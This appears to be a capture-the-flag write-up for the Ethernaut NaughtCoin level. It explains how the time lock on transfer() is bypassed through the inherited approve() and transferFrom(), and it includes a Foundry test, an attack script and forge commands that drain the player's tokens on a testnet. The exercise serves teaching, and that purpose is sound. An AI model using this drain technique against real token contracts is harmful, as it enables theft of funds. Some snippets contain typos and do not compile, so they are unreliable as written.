## 🎯 Objective:
---
- The objective of this contract is to drain the players ERC20 token.
---
## 📄 Contracts Overview
---
### NaughtCoin 

- This contract have `3 state variables`, `1 constructor`, `1 function` and `1 modifier`
	- State Variables:
		- `timeLock`: uint256 public visibility
		- `INITIAL_SUPPLY`: uint256 public visibility
		- `player`: address public visibility
	- Constructor:
		- `ERC20 constructor`: A standard Constructor used from Openzeppelin's ERC20.sol contract.
	- Function:
		- `transfer()`: overrided function from ERC20 standard contract.
	- Modifier:
		- `lockTokens()`: modifier

---
## 🧠 Vulnerability: NaughtCoin
---
- The bug of this contract is not to use access control over the ERC20 standard functions like
	- transfer()
	- transferFrom()
	- approve()
	- So any function can be called/used without any constraints. 
- As NaughtCoin contract is inherited from Openzeppelin's ERC20 standard contract.
- So NaughtCoin can use all the functions from ERC20 contract.


```lockTokens()
//uint256 public timeLock = bloc.timestamp + 10 * 365 days;

modifer lockTokens(){
	if(msg.sender == player){
		require(block.timestamp > timeLock);
		_;
	} else {
		_;
	}
}

```
- By this way the contract locks the user's {player's} token for 10 year
- it only by passes if the declared timestamp(10 year)> current timestamp.

```transfer()
function transfer(address _to, uint256 _value) public override lockTokens returns(bool){
	super.transfer()
}
```
- This function is overrode from the ERC20 contract as its function is to transfer minted tokens to the receiver's address.
- But as there is `lockTokens` modifier so this function can only allow the player to transfer the tokens only after 10 year because of time constraints.

```approve()
function approve(address spender, uint256 value) public virtual returns (bool) {
	logic
}
```
- This function of ERC20 contract approve a address to spend a certain value before any transfer is done.

```transferFrom()
function transferFrom(address _from, address _to, uint256 amount){
	//logic
}
```
- This function of ERC20 contract allow a approved address to send a certain amount to a specific address.
- This only can be done if the address is approved.
---
## Attack Flow:
---
- To exploit this bug a attacker only have to call some functions and the contract is drained {exploited}.
```attack
Attack contract is made with the contstructor that takes NaughtCoin as the parameter.
| Approval Step
V
Then ERC20's approve function is called to approve the spender's address to spend some amount. 
| Exploit Step
V
Then ERC20's transferFrom function called as, there is no constraints or boundries for transferFrom() funcion so any approved address can call and use the function as exploit tool to drain the players token.
```
---
## 🧪 Test - TestNaughtCoin.t.sol
---

| TestName     | What it Checks                                                                            |
| ------------ | ----------------------------------------------------------------------------------------- |
| testTransfer | Checks weather the transfrom Function of ERC20 is able to drain the players token or not. |

---
### Key exploit(in test):
---
```solidity
function testTransfer() public {
	address player = naughtcoin.player();
	uint256 amount = naughtcoin.INITIAL_SUPPLY();
	vm.prank(player);
	naughtcoin.approve(address(attack), amount);
	attack.attack();
	assertEq(naughtcoin.balanceOf(address(attack)), amount);
	assertEq(naughtcoin.balanceOf(player), 0);
}
```
- The exploit in this file is:
	- `naughtcoin.approve(address(attack), amount)` and  `attack.attack(): as both function is important to exploit the function wihtout approval tranferFrom wont execute so to tranferFrom needs to use a approved address.
---
## 🚀 On-Chain - AttackNaughtCoin.s.sol
---
```solidity
function run() external {
vm.startBroadcast();
	naughtcoin = NaughtCoin(instance);
	attack = new AttackNaughtCoin(address(naughtcoin));
	address player = naughtcoin.player();
	uint256 amount = naughtcoin.INITIAL_SUPPLY();
	console.log(
		"Balance of Initial Supply: ",
		naughtcoin.balanceOf(player)
	);
	console.log(
		"Balance of the attacker: ",
		naughtcoin.balanceOf(address(attack))
	);
	naughtcoin.approve(address(attack), amount);
	attack.attack();
	console.log(
		"Balance of Initial supply: ",
		naughtcoin.balanceOf(player)
	);
	console.log(
		"Balance of Attacker: ",
		naughtcoin.balanceOf(address(attack))
	);
	vm.stopBroadcast();
}
```
---
## 🛠️ How to Run
---
## Run Tests(Local Anvil)
---
```bash
forge test --mt testTransfer -vvvv
```
---
## Deploy & Attack (On-chain)
---
```bash
forge script script/AttackNaughtCoinScript.s.sol --rpc-url $SEPOLIA_RPC --private-key $PRIVATE_KEY --broadcast
```
---
## 📁 Project Structure
---
```file
├── src/
│   └──NaughtCoin.sol
|	└──AttackNaughtCoin.sol        # call the attack function
├── script/
│   ├── DeployNaughtCoin.s.sol
│   └── AttackNaughtcoinSctipt.s.sol
└── test/
    └── TestNaughtCoin.t.sol
```
---
